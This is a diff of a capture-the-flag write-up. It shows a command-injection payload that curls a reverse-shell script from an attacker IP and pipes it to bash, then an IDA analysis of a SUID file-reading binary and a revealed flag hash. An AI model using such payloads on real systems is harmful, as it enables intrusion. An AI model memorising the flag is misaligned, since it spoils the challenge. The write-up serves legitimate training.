@@ -37,10 +37,26 @@ After hours of trying payloads, I found that this `|nc${IFS}10.11.85.53${IFS}555
 Now, to get a reverse shell, since we can't use `-`, what we can do is create a `rev.sh` file in our attacker's machine(can be found inside this folder). Next open a netcat listener on the attacker's machine, `nc -lnvp 6666`, and inject the curl command to get the rev.sh file and pipe it into bash. The final payload is this: `|curl${IFS}10.11.85.53/rev.sh|bash` :<br />
 ![image](https://github.com/user-attachments/assets/5efb5384-f0ed-4d03-ad29-ed0535c63592)<br />
 Again, [stabilize the shell](https://maxat-akbanov.com/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal). <br />
-TO BE CONTINUED...
+I'm now the user `john` and got the first flag. Running again linpeas on the system, there's a SUID file inside `/home/youcef`, called `readfile`. It seems to be working like a `cat` command. If I use it to try to read something on which I don't have permissions, this is what i get: <br />
+![image](https://github.com/user-attachments/assets/14814808-a0c9-4b14-aa1a-7a428f809db1)<br />
+Also, it doesn't seem to be vulnerable to buffer overflow because I tried running it with really large inputs, but it never goes into segmentation fault. So I decided to analyze it using IDA (I first had to transfer it on my local machine using netcat).<br />
+![image](https://github.com/user-attachments/assets/ef559c13-0022-4f04-8b3f-9100b48fdb74)<br />
+At the beginning of the main function, there are three checks. The first checks that the program only takes one input from the command line. The second checks that the file_name is valid, and the third checks that the user running the binary is actually john, with id=1002. Next:<br />
+![image](https://github.com/user-attachments/assets/63b003a1-c324-4778-bfe2-ae85fefac356)<br />
+Here the program uses the function `_strstr` to check if the filename contains the word "flag" and the word "id_rsa". Then it checks if it's a symlink with the `lstat` function, and if it can be accessed with the `_access` function. If any of these conditions are true, then it jumps to the following block:<br />
+![image](https://github.com/user-attachments/assets/f13e1d7a-1bf0-4676-aea8-0448e42dc7c8)<br />
+And the program stops. If we pass all the checks, then the program goes here: <br />
+![image](https://github.com/user-attachments/assets/c69142c8-7751-49ce-aef6-aac01a94f04a)<br />
+Here it's opening the file with the function `_open`, and if the the function fails, it will call `__assert_fail` and the program will stop. <br />
+Instead, if the file is opened correctly, the program goes here: <br />
+![image](https://github.com/user-attachments/assets/40be8666-5de7-407f-8b3a-4d4f171e9874)<br />
+Here the program is calling the `_read` function every 1024 bytes. It then sets the file descriptor to 1 (sdtoutput) and calls `_write`, so that the user can read the file. It then checks if the number of written bytes is zero: if it is, then the program stops; if it isn't, then it will read the next 1024 bytes.  
 
 
 
-- What is the first flag? 
+
+
+
+- What is the first flag? `5c3ea0d312568c7ac68d213785b26677`
 - What is the second flag?
 - What is the root flag?
